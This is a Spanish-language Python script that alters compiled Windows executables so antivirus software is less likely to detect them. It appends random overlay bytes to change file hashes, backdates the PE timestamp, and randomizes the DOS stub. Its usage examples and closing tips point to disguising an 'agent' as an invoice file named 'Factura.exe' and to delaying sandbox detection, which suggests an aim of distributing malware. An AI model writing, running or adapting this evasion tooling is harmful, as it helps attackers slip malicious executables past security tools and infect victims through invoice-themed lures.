#!/usr/bin/env python3
"""
Script para mejorar evasión AV de EXE ya compilados
Aplica técnicas de ofuscación post-compilación
"""

import sys
import os
import struct
import random
from pathlib import Path

def add_overlay_data(exe_path):
    """
    Añadir datos overlay al final del EXE (común en software legítimo)
    Esto cambia el hash sin afectar la funcionalidad
    """
    print(f"[🔧] Añadiendo overlay data...")
    
    with open(exe_path, 'rb') as f:
        exe_data = bytearray(f.read())
    
    # Generar overlay aleatorio (simula certificados/recursos adicionales)
    overlay_size = random.randint(1024, 4096)
    overlay = bytearray(random.getrandbits(8) for _ in range(overlay_size))
    
    # Añadir overlay
    exe_data.extend(overlay)
    
    # Guardar
    with open(exe_path, 'wb') as f:
        f.write(exe_data)
    
    print(f"[✅] Overlay añadido: {overlay_size} bytes")


def modify_pe_timestamp(exe_path):
    """
    Modificar timestamp PE para parecer más antiguo (menos sospechoso)
    """
    print(f"[🔧] Modificando PE timestamp...")
    
    with open(exe_path, 'rb') as f:
        exe_data = bytearray(f.read())
    
    # Verificar PE signature
    if exe_data[0:2] != b'MZ':
        print("[❌] No es un archivo PE válido")
        return False
    
    # Obtener offset del PE header
    pe_offset = struct.unpack('<I', exe_data[0x3C:0x40])[0]
    
    # Verificar PE signature
    if exe_data[pe_offset:pe_offset+4] != b'PE\x00\x00':
        print("[❌] PE header no encontrado")
        return False
    
    # Timestamp está en offset +8 del PE header
    timestamp_offset = pe_offset + 8
    
    # Generar timestamp antiguo (ej: 2-3 años atrás)
    import time
    old_timestamp = int(time.time()) - random.randint(63072000, 94608000)  # 2-3 años
    
    # Modificar timestamp
    struct.pack_into('<I', exe_data, timestamp_offset, old_timestamp)
    
    # Guardar
    with open(exe_path, 'wb') as f:
        f.write(exe_data)
    
    print(f"[✅] Timestamp modificado a {time.strftime('%Y-%m-%d', time.localtime(old_timestamp))}")
    return True


def add_pe_sections(exe_path):
    """
    Añadir secciones PE vacías (común en software legítimo)
    """
    print(f"[🔧] Añadiendo secciones PE...")
    
    # Esta operación es compleja y puede romper el EXE
    # Por ahora solo simulamos
    print(f"[⚠️] Característica en desarrollo")
    return True


def randomize_stub_dos(exe_path):
    """
    Randomizar el DOS stub (no afecta ejecución en Windows)
    """
    print(f"[🔧] Randomizando DOS stub...")
    
    with open(exe_path, 'rb') as f:
        exe_data = bytearray(f.read())
    
    # DOS stub va de 0x40 hasta el PE header
    pe_offset = struct.unpack('<I', exe_data[0x3C:0x40])[0]
    
    # Randomizar bytes del DOS stub (excepto primeros 64 bytes críticos)
    if pe_offset > 0x80:
        for i in range(0x80, pe_offset):
            if random.random() < 0.3:  # 30% de probabilidad
                exe_data[i] = random.randint(0, 255)
    
    # Guardar
    with open(exe_path, 'wb') as f:
        f.write(exe_data)
    
    print(f"[✅] DOS stub randomizado")
    return True


def sign_exe_fake(exe_path):
    """
    Añadir estructura de firma digital falsa (NO FUNCIONAL)
    Solo para confundir análisis automático
    """
    print(f"[🔧] Añadiendo estructura de firma...")
    print(f"[⚠️] Firma no funcional (solo cosmética)")
    
    # Para firma real se necesita certificado válido
    # Aquí solo añadimos estructura para confundir scanners
    
    return True


def main():
    """Script principal"""
    import argparse
    
    parser = argparse.ArgumentParser(
        description='Mejorar evasión AV de EXE compilados',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Ejemplos:
  # Aplicar todas las técnicas
  python enhance_av_evasion.py Factura.exe
  
  # Solo modificar timestamp
  python enhance_av_evasion.py Factura.exe --timestamp-only
  
  # Backup automático
  python enhance_av_evasion.py Factura.exe --backup
"""
    )
    
    parser.add_argument('exe', help='Ruta al EXE a mejorar')
    parser.add_argument('--timestamp-only', action='store_true', 
                       help='Solo modificar timestamp PE')
    parser.add_argument('--overlay-only', action='store_true',
                       help='Solo añadir overlay data')
    parser.add_argument('--backup', action='store_true',
                       help='Crear backup antes de modificar')
    parser.add_argument('-o', '--output', 
                       help='Ruta de salida (por defecto sobrescribe)')
    
    args = parser.parse_args()
    
    # Validar entrada
    exe_path = Path(args.exe)
    if not exe_path.exists():
        print(f"[❌] Archivo no encontrado: {exe_path}")
        return 1
    
    if not exe_path.suffix.lower() == '.exe':
        print(f"[❌] El archivo debe ser .exe")
        return 1
    
    # Backup si se solicita
    if args.backup:
        backup_path = exe_path.with_suffix('.exe.bak')
        print(f"[💾] Creando backup: {backup_path}")
        import shutil
        shutil.copy2(exe_path, backup_path)
    
    # Output path
    if args.output:
        output_path = Path(args.output)
        print(f"[📝] Copiando a: {output_path}")
        import shutil
        shutil.copy2(exe_path, output_path)
        exe_path = output_path
    
    print(f"\n[🚀] Mejorando evasión de: {exe_path}")
    print(f"[📊] Tamaño original: {exe_path.stat().st_size / (1024*1024):.2f} MB\n")
    
    # Aplicar técnicas
    if args.timestamp_only:
        modify_pe_timestamp(str(exe_path))
    elif args.overlay_only:
        add_overlay_data(str(exe_path))
    else:
        # Aplicar todas las técnicas
        modify_pe_timestamp(str(exe_path))
        add_overlay_data(str(exe_path))
        randomize_stub_dos(str(exe_path))
    
    print(f"\n[✅] Proceso completado")
    print(f"[📊] Tamaño final: {exe_path.stat().st_size / (1024*1024):.2f} MB")
    print(f"\n[💡] Recomendaciones adicionales:")
    print(f"   • Probar el EXE antes de distribución")
    print(f"   • Usar nombre de archivo legítimo (ej: Factura_2025.exe)")
    print(f"   • Cambiar ubicación de extracción del agente")
    print(f"   • Agregar más delay en sandbox detection")
    
    return 0


if __name__ == '__main__':
    sys.exit(main())
